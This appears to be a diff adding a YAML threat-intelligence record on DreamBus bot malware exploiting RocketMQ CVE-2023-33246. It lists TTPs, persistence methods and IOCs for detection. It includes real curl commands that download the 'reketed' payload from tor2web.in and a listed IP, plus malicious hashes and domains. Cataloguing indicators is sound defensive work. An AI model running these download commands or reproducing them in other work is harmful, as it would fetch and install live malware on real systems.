@@ -1,0 +1,45 @@
+description: In May 2023, a vulnerability affecting RocketMQ servers (CVE-2023-33246)
+  was publicly disclosed. This led to attacks where threat actors exploited the vulnerability
+  to install the DreamBus bot malware.
+malware_families:
+- DreamBus
+TTPs:
+  processes:
+  - reketed
+  commandline:
+  - curl -fsSkLA- tor2web.in/roket -o reketed
+  - curl -fsSkLA- 92.204.243.155:8080/roket > reketed
+  powershell: null
+  scripting_engine:
+  - bash
+  registry_keys: null
+  image_load: null
+  network_connections:
+  - executable: curl
+    destination_address: tor2web.in
+    port: 80
+  - executable: curl
+    destination_address: 92.204.243.155
+    port: 8080
+  file_activity:
+  - /tmp/reketed
+  - ./.$(date|md5sum|head -c20)
+  persistence:
+  - systemd-tmpfiles-cleanup.timer
+  - cron job for reketed script
+  pipes: null
+  process_relations: null
+IOCs:
+  hashes:
+  - 1d0c3e35324273ffeb434f929f834b59dcc6cdd24e9204abd32cc0abefd9f047
+  - 601a2ff4a7244ed41dda1c1fc71b10d3cfefa34e2ef8ba71598f41f73c031443
+  IPs:
+  - 92.204.243.155
+  domains:
+  - tor2web.in
+  - ru6r4inkaf4thlgflg4iqs5mhqwqubols5qagspvya4whp3dgbvmyhad.onion
+authors:
+- Paul Kimayong
+reference: https://blogs.juniper.net/en-us/threat-research/dreambus-botnet-resurfaces-targets-rocketmq-vulnerability
+date_of_publication: August 28, 2023
+file_creation_date: August 03, 2025
